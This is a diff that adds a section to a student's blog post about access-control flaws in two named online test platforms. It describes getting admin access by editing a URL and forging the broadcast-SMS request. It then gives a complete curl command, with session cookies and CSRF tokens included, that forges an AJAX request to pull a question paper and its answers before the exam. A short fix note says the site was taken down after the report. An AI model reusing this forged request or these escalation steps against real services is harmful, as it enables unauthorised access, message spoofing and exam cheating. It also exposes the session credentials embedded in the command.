@@ -23,6 +23,21 @@
 			<h2>Vibrant</h2>
 			<p>Vibrant had recently opened up an online platform for giving tests and stuff related to that.Being a student of the same institution the student logins were indeed given to us. The trick lied in getting the <b>administrator login</b>. Here is the thing: the site simply wasnt checking if you are a student or not if you had the right URL for the admin console and could somehow enter that with the student login it would open up. So all you had to do was change the "dashboard/" in the url with "admindashboard/" and bingo!!</p>
 			<img class="img-fluid w-25 h-50" src="http://iamayushanand.github.io/assets/images/30oct2020/picone.jpeg" alt="admin access">
+			Worse yet is the fact that the APIs even tho they do check weather or not the person is a member of the organisation do not check if they are student or admins. This allows me the freedom to even send messages(SMS) directly from the vibrant winuall servers.All you had to do was go to the broadcast message option in admin console and then view the http packet that gets sent.
+			<img class="img-fluid w-25 h-50" src="http://iamayushanand.github.io/assets/images/30oct2020/pictwo.jpeg" alt="Messaging">
+			and then you can modify it as you want!!.</p>
+			<h3>The fix</h3>
+			<p>The admin consoles should not have been linked with the student consoles directly and proper checks should have been put in place.When I pointed this out the site was taken down as can be evident now and it is not in use. The other platform which is now developed vibrant phoenix has its own share of security flaws which is a topic of later time and will be addressed.Here we see how despite all the low level precautions like using ssl the site was insecure because of a design flaw.</p>
+			<h2>Allen</h2>
+			<p>This one was a bit more complicated than the others.This one handled a lot of server side things via frontend itself using ajax calls without verifications at the server side.Hence all you had to do was modify and forge those particular http requests and you will be given the info you need.</p>
+			<p>
+			<h3>Here is the code which could fetch you the paper data before the test was conducted</h3>
+			<pre>
+			<code>
+			curl 'https://www.onlinetestseries.in/common/ajax-paper-info/get-questions?paper_id=9869&index=1&num=75&type=question&time=1581853364376' -H 'Connection: keep-alive' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36' -H 'Accept: */*' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-Mode: cors' -H 'Referer: https://www.onlinetestseries.in/allenkota/view-paper?test_id=5485&package_id=532' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9' -H 'Cookie: PHPSESSID=mr2f2rr4rp0tq2oojv9nbb1sb1; _fbp=fb.1.1558276635205.446267997; is_reopen_site=no; __zlcmid=tdiRF6EXEjVBnZ; mp_d9e3f0dffffce01b92ba073a6b5e7f47_mixpanel=%7B%22distinct_id%22%3A%20%2216d05d2dffe4d4-0cfa660a8151ff-37637e07-fa000-16d05d2dfff476%22%2C%22%24device_id%22%3A%20%2216d05d2dffe4d4-0cfa660a8151ff-37637e07-fa000-16d05d2dfff476%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.onlinetestseries.in%2Fallenkota%22%2C%22%24initial_referring_domain%22%3A%20%22www.onlinetestseries.in%22%7D; _ga_J9SWWKSX5E=GS1.1.1571249630.3.0.1571249630.0; edooniCart=b%3A0%3B; edpart01=a%3A3%3A%7Bi%3A0%3Bs%3A12%3A%22OL5297573613%22%3Bi%3A1%3Bs%3A32%3A%22ae0e8e2e5c6ecf0f21434ae1bfc22e55%22%3Bi%3A2%3Bi%3A1581579200%3B%7D; edoonilogin_flag=OL5297573613; _gid=GA1.2.1330165000.1581772044; _ga=GA1.1.476997619.1558276607; _ga_494FENXVLG=GS1.1.1581851687.107.0.1581851696.0; AWSELB=E7A1BFB30C90B18F37FB2A0B1B3ABA2A46602CF1BF2667483D995535D74BD5FAF76D20534FDCE090E3E6B3952B09CB2EB507CCF66195AA9B5EC50D8461F6DF99D7199260AD; AWSELBCORS=E7A1BFB30C90B18F37FB2A0B1B3ABA2A46602CF1BF2667483D995535D74BD5FAF76D20534FDCE090E3E6B3952B09CB2EB507CCF66195AA9B5EC50D8461F6DF99D7199260AD; EDNCSRF=f142157088beba8b1f8737cf26dc6007; EDNCSRFURIKEY=L2FsbGVua290YS9jc3Mvc3R5bGUvdGVzdC1mcmFtZXdvcmsuY3Nz' --compressed
+			</code>
+			</pre>
+			<p>The above code gives you the question paper data and their answers in a json format</p>
 		</div>
 	</body>
 
